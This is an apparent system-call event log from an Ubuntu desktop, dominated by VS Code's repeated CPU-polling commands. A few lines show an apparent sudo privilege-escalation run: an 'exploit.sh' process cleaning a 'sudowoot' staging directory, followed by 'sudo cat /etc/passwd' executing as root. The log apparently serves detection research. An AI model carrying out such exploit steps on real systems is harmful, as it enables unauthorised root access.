+EXEC|execve|5402253418842|9201|9184|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5402259946327|9203|9184|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5402264943927|9205|9184|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5402269785566|9207|9184|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5403197826174|9209|9080|1000|exploit.sh|rm -rf /tmp/sudowoot.stage.tH466A
+CLONE|9209|9080|5403197355824
+CLONE3|9210|1038|5408049273567
+FILE_CREATE|1000|2625|0|0|/home/ubuntu/.local/share/gnome-shell/application_state|gnome-shell
+FILE_CREATE|1000|2625|0|0|/home/ubuntu/.local/share/gnome-shell/.goutputstream-U23BM3|gnome-shell
+CLONE3|9213|2625|5436948292033
+EXEC|execve|5490071405193|9214|1|0|systemd|/usr/lib/systemd/systemd-executor --deserialize 104 --log-level info --log-target journal-or-kmsg
+CLONE|9217|9073|5539757466418
+EXEC|execve|5539758583923|9217|9073|1000|bash|sudo /etc/passwd
+FILE_CREATE|1000|9217|0|0|1000|sudo
+CLONE|9218|5761|5541677461245
+EXEC|execve|5541678371532|9218|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5541684107690|9219|9218|1000|sh|which ps
+EXEC|execve|5541696298414|9220|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5541701666501|9221|9220|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5541745082062|9222|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5541749234530|9223|9222|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5541753450162|9224|9223|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5541759564259|9225|9223|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5541763078523|9226|9223|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5541766645232|9227|9223|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5541770519881|9228|9223|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5541774561530|9229|9223|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5541778313265|9230|9223|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5541781979829|9231|9223|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5541785747062|9232|9223|1000|cpuUsage.sh|sleep 1
+CLONE|9233|9223|5542790615392
+EXEC|execve|5542791680658|9233|9223|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5542799115384|9234|9223|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5542805351830|9236|9223|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5542812223275|9238|9223|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5542817461699|9240|9223|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5542822281666|9242|9223|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5542827686793|9244|9223|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5542832494828|9246|9223|1000|cpuUsage.sh|cat /proc/9015/stat
+CLONE|9248|9073|5548038686533
+EXEC|execve|5548039262120|9248|9073|1000|bash|sudo cat /etc/passwd
+FILE_CREATE|1000|9248|0|0|1000|sudo
+CLONE|9250|9249|5548063913819
+EXEC|execve|5548065166080|9250|9249|0|sudo|cat /etc/passwd
+CLONE|9251|5761|5549066303439
+EXEC|execve|5549067339150|9251|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5549073054861|9252|9251|1000|sh|which ps
+EXEC|execve|5549083840015|9253|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5549089312278|9254|9253|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5549129827017|9255|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5549134342309|9256|9255|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5549139548699|9257|9256|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5549145072672|9258|9256|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5549149995175|9259|9256|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5549155053005|9260|9256|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5549158762254|9261|9256|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5549162731692|9262|9256|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5549166551178|9263|9256|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5549170289707|9264|9256|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5549174386406|9265|9256|1000|cpuUsage.sh|sleep 1
+CLONE|9266|9256|5550179557148
+EXEC|execve|5550180777980|9266|9256|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5550190229995|9267|9256|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5550196795827|9269|9256|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5550203052752|9271|9256|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5550208450463|9273|9256|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5550214283121|9275|9256|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5550220855586|9277|9256|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5550228787004|9279|9256|1000|cpuUsage.sh|cat /proc/9015/stat
+CLONE|9281|5761|5554066592143
+EXEC|execve|5554067786984|9281|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5554074314634|9282|9281|1000|sh|which ps
+EXEC|execve|5554082354435|9283|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5554087683131|9284|9283|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5554128779925|9285|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5554136125014|9286|9285|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5554140264227|9287|9286|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5554145666340|9288|9286|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5554152388059|9289|9286|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5554156688217|9290|9286|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5554161524934|9291|9286|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5554167365940|9292|9286|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5554171854366|9293|9286|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5554176556475|9294|9286|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5554181124182|9295|9286|1000|cpuUsage.sh|sleep 1
+CLONE|9296|9286|5555185318390
+EXEC|execve|5555187962248|9296|9286|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5555198682083|9297|9286|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5555205584609|9299|9286|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5555213463098|9301|9286|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5555220437394|9303|9286|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5555228663223|9305|9286|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5555235647353|9307|9286|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5555241257687|9309|9286|1000|cpuUsage.sh|cat /proc/9015/stat
+FILE_CREATE|1000|5705|0|0|/home/ubuntu/.config/Code/.org.chromium.Chromium.y0DFlN|ThreadPoolForeg
+FILE_CREATE|1000|3524|0|0|/run/user/1000/dconf/user|update-notifier
+FILE_CREATE|1000|5705|0|0|/home/ubuntu/.config/Code/Cache/Cache_Data/index-dir/temp-index|ThreadPoolForeg
+CLONE|9314|1008|5783931548491
+CLONE|9315|9314|5783941401174
+EXEC|execve|5783945492076|9315|9314|0|cron|/bin/sh -c command -v debian-sa1 > /dev/null && debian-sa1 1 1
+EXEC|execve|5783945845012|9316|9015|0|python3|/usr/bin/dot -T dot
+CLONE3|9316|9015|5783946847188
+FILE_CREATE|0|9315|0|0|/dev/null|sh
+EXEC|execve|5783950599938|9319|9315|0|sh|debian-sa1 1 1
+CLONE|9322|5761|5784950816275
+EXEC|execve|5784951754156|9322|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5784954728123|9323|9322|1000|sh|which ps
+EXEC|execve|5784961803421|9324|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5784964805904|9325|9324|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5784990597598|9326|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5784993852984|9327|9326|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5784996069210|9328|9327|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5784999361150|9329|9327|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5785003259965|9330|9327|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5785005471431|9331|9327|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5785007673572|9332|9327|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5785010046610|9333|9327|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5785012378174|9334|9327|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5785015480388|9335|9327|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5785018236260|9336|9327|1000|cpuUsage.sh|sleep 1
+CLONE|9351|5774|5785578972006
+EXEC|execve|5785580476196|9351|5774|1000|code|git check-ignore -v -z --stdin
+CLONE|9352|9327|5786021449182
+EXEC|execve|5786022446113|9352|9327|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5786029416717|9353|9327|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5786034810558|9355|9327|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5786041164945|9357|9327|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5786046777361|9359|9327|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5786051625160|9361|9327|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5786056925953|9363|9327|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5786062804651|9365|9327|1000|cpuUsage.sh|cat /proc/9015/stat
+CLONE|9367|5761|5789955809348
+EXEC|execve|5789956450941|9367|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5789961845392|9368|9367|1000|sh|which ps
+EXEC|execve|5789971421290|9369|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5789976788982|9370|9369|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5790024742202|9371|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5790029393324|9372|9371|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5790034815231|9373|9372|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5790040088867|9374|9372|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5790043817896|9375|9372|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5790049681822|9376|9372|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5790053475592|9377|9372|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5790058072165|9378|9372|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5790062657842|9379|9372|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5790067140326|9380|9372|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5790070986019|9381|9372|1000|cpuUsage.sh|sleep 1
+CLONE|9382|9372|5791075329687
+EXEC|execve|5791076162897|9382|9372|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5791081691936|9383|9372|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5791087938463|9385|9372|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5791094188969|9387|9372|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5791100596581|9389|9372|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5791106560334|9391|9372|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5791113973304|9393|9372|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5791120634490|9395|9372|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5794222621692|9397|1|0|systemd|/usr/lib/systemd/systemd-executor --deserialize 111 --log-level info --log-target journal-or-kmsg
+CLONE|9401|5761|5822678115149
+EXEC|execve|5822678355092|9401|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5822680282365|9402|9401|1000|sh|which ps
+EXEC|execve|5822683257560|9403|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5822684660739|9404|9403|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5822699664917|9405|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5822701442245|9406|9405|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5822703176425|9407|9406|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5822704862993|9408|9406|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5822706329142|9409|9406|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5822707652322|9410|9406|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5822708962650|9411|9406|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5822710479597|9412|9406|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5822711839004|9413|9406|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5822713087929|9414|9406|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5822714255382|9415|9406|1000|cpuUsage.sh|sleep 1
+CLONE|9416|9406|5823716616608
+EXEC|execve|5823717192840|9416|9406|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5823719199186|9417|9406|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5823720998624|9419|9406|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5823722751678|9421|9406|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5823724533275|9423|9406|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5823726463457|9425|9406|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5823728084727|9427|9406|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5823729641749|9429|9406|1000|cpuUsage.sh|cat /proc/9015/stat
+CLONE|9431|8770|5830444670338
+EXEC|execve|5830446627382|9431|8770|1000|gnome-terminal-|bash
+FILE_CREATE|1000|2370|0|0|/run/user/1000/systemd/transient/vte-spawn-efd14688-c878-4764-9d7a-27cc482aee10.scope|systemd
+EXEC|execve|5830451115270|9433|9431|1000|bash|lesspipe
+FILE_CREATE|1000|2370|0|0|/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-efd14688-c878-4764-9d7a-27cc482aee10.scope/cgroup.subtree_control|systemd
+EXEC|execve|5830452837127|9434|9433|1000|lesspipe|basename /usr/bin/lesspipe
+CLONE|9436|9435|5830454142026
+EXEC|execve|5830454245854|9436|9435|1000|lesspipe|dirname /usr/bin/lesspipe
+EXEC|execve|5830457098057|9437|9431|1000|bash|dircolors -b
+FILE_CREATE|1000|9431|0|0|/dev/null|bash
+EXEC|execve|5830560886826|9438|1|0|systemd|/usr/lib/systemd/systemd-executor --deserialize 111 --log-level info --log-target journal-or-kmsg
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/chatEditingSessions/0d1f1cf5-bd31-4bbe-8828-56832b0f390f/state.json|libuv-worker
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/state.vscdb-journal|libuv-worker
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/state.vscdb-journal|libuv-worker
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/state.vscdb-journal|libuv-worker
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/state.vscdb-journal|libuv-worker
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/state.vscdb-journal|libuv-worker
+FILE_CREATE|1000|5638|0|0|/home/ubuntu/.config/Code/User/workspaceStorage/f85555962383b248c2a7b7b6a29da9db/state.vscdb-journal|libuv-worker
+CLONE|9441|8770|5838869395616
+EXEC|execve|5838870299411|9441|8770|1000|gnome-terminal-|bash
+EXEC|execve|5838874410928|9442|9441|1000|bash|lesspipe
+FILE_CREATE|1000|2370|0|0|/run/user/1000/systemd/transient/vte-spawn-a70ae804-b667-4d20-9ba7-2ccaea7a13a6.scope|systemd
+FILE_CREATE|1000|2370|0|0|/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-a70ae804-b667-4d20-9ba7-2ccaea7a13a6.scope/cgroup.subtree_control|systemd
+EXEC|execve|5838877488620|9443|9442|1000|lesspipe|basename /usr/bin/lesspipe
+CLONE|9445|9444|5838879879701
+EXEC|execve|5838880055631|9445|9444|1000|lesspipe|dirname /usr/bin/lesspipe
+EXEC|execve|5838883223622|9446|9441|1000|bash|dircolors -b
+FILE_CREATE|1000|9441|0|0|/dev/null|bash
+CLONE|9447|1008|5843958569225
+CLONE|9448|9447|5843962990498
+EXEC|execve|5843966452743|9448|9447|0|cron|/bin/sh -c [ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi
+EXEC|execve|5843965300341|9449|9015|0|python3|/usr/bin/dot -T dot
+CLONE3|9449|9015|5843965929653
+CLONE|9453|5761|5844965749019
+EXEC|execve|5844966019756|9453|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5844968110550|9454|9453|1000|sh|which ps
+EXEC|execve|5844970657474|9455|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5844972357728|9456|9455|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5844988546502|9457|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5844991244166|9458|9457|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5844993109227|9459|9458|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5844994839260|9460|9458|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5844996284218|9461|9458|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5844997597124|9462|9458|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5844998835089|9463|9458|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5845000757578|9464|9458|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5845002360228|9465|9458|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5845004646582|9466|9458|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5845005969428|9467|9458|1000|cpuUsage.sh|sleep 1
+CLONE|9468|5774|5845054731462
+EXEC|execve|5845056593511|9468|5774|1000|code|git check-ignore -v -z --stdin
+CLONE|9469|9458|5846007706712
+EXEC|execve|5846007947045|9469|9458|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5846009780109|9470|9458|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5846013036541|9472|9458|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5846015579358|9474|9458|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5846017517422|9476|9458|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5846019750517|9478|9458|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5846022835468|9480|9458|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5846024935079|9482|9458|1000|cpuUsage.sh|cat /proc/9015/stat
+CLONE|9484|5761|5849966836291
+EXEC|execve|5849967188894|9484|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5849969717071|9485|9484|1000|sh|which ps
+EXEC|execve|5849973558151|9486|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5849975583403|9487|9486|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5849995467999|9488|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5849997644527|9489|9488|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5850000027254|9490|9489|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5850002539100|9491|9489|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5850003924413|9492|9489|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5850006048837|9493|9489|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5850007766305|9494|9489|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5850009780091|9495|9489|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5850011737751|9496|9489|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5850013335764|9497|9489|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5850014634410|9498|9489|1000|cpuUsage.sh|sleep 1
+CLONE|9499|9489|5851017732896
+EXEC|execve|5851018405814|9499|9489|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5851020401800|9500|9489|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5851022549288|9502|9489|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5851024516883|9504|9489|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5851026912629|9506|9489|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5851028950519|9508|9489|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5851031787664|9510|9489|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5851033633441|9512|9489|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5854968165471|9514|5761|1000|code|/bin/sh -c which ps
+CLONE|9514|5761|5854967733414
+EXEC|execve|5854970060366|9515|9514|1000|sh|which ps
+EXEC|execve|5854972943399|9516|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5854974189903|9517|9516|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5854988533110|9518|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5854989868127|9519|9518|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5854991567332|9520|9519|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5854993462719|9521|9519|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5854994873794|9522|9519|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5854996233079|9523|9519|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5854997481629|9524|9519|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5854998871923|9525|9519|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5855000227862|9526|9519|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5855001383677|9527|9519|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5855002531091|9528|9519|1000|cpuUsage.sh|sleep 1
+CLONE|9529|9519|5856004170789
+EXEC|execve|5856004550378|9529|9519|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5856007319814|9530|9519|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5856010014533|9532|9519|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5856012090549|9534|9519|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5856014766913|9536|9519|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5856017726015|9538|9519|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5856020164425|9540|9519|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5856022724994|9542|9519|1000|cpuUsage.sh|cat /proc/9015/stat
+CLONE|9544|9441|5857577028185
+EXEC|execve|5857577584540|9544|9441|1000|bash|sudo cat /etc/passwd
+FILE_CREATE|1000|9544|0|0|1000|sudo
+CLONE|9545|9544|5858415826949
+EXEC|execve|5858416606767|9546|9545|0|sudo|cat /etc/passwd
+CLONE|9546|9545|5858416438339
+CLONE|9547|5761|5859964550434
+EXEC|execve|5859964772842|9547|5761|1000|code|/bin/sh -c which ps
+EXEC|execve|5859966258941|9548|9547|1000|sh|which ps
+EXEC|execve|5859969330015|9549|5761|1000|code|/bin/sh -c /usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5859970736137|9550|9549|1000|sh|/usr/bin/ps -ax -o pid=,ppid=,pcpu=,pmem=,command=
+EXEC|execve|5859986440828|9551|5761|1000|code|/bin/sh -c "/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh" 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5859988483433|9552|9551|1000|sh|/usr/share/code/resources/app/out/vs/base/node/cpuUsage.sh 5872 6456 8943 6463 9014 6464 9015
+EXEC|execve|5859991061752|9553|9552|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5859992828014|9554|9552|1000|cpuUsage.sh|cat /proc/5872/stat
+EXEC|execve|5859994323922|9555|9552|1000|cpuUsage.sh|cat /proc/6456/stat
+EXEC|execve|5859996210594|9556|9552|1000|cpuUsage.sh|cat /proc/8943/stat
+EXEC|execve|5859997524580|9557|9552|1000|cpuUsage.sh|cat /proc/6463/stat
+EXEC|execve|5859998788937|9558|9552|1000|cpuUsage.sh|cat /proc/9014/stat
+EXEC|execve|5860000102190|9559|9552|1000|cpuUsage.sh|cat /proc/6464/stat
+EXEC|execve|5860001734260|9560|9552|1000|cpuUsage.sh|cat /proc/9015/stat
+EXEC|execve|5860002933548|9561|9552|1000|cpuUsage.sh|sleep 1
+CLONE|9562|9552|5861005168568
+EXEC|execve|5861005698540|9562|9552|1000|cpuUsage.sh|sed -n s/^cpu\s//p /proc/stat
+EXEC|execve|5861009150112|9563|9552|1000|cpuUsage.sh|cat /proc/5872/stat
